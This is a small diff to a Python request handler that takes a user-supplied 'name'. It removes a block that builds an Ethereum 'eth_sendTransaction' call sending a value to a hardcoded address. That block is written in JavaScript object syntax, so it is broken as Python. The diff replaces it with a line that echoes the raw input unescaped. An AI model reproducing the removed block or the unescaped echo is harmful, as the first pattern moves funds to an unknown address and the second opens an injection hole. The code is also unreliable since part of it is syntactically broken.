@@ -21,13 +21,4 @@ def parse_request():
     post_data = request.json  # Assuming JSON data is posted
     # Process the post_data
     render_string = post_data["name"]
-    data = {
-        chainId: "eip155:10",
-        method: "eth_sendTransaction",
-        params: {
-            to: "0x00000000fcCe7f938e7aE6D3c335bD6a1a7c593D",
-            data: render_string,
-            value: "984316556204476",
-        },
-    }
-    return render_string
+    return f"Hello, {render_string}"
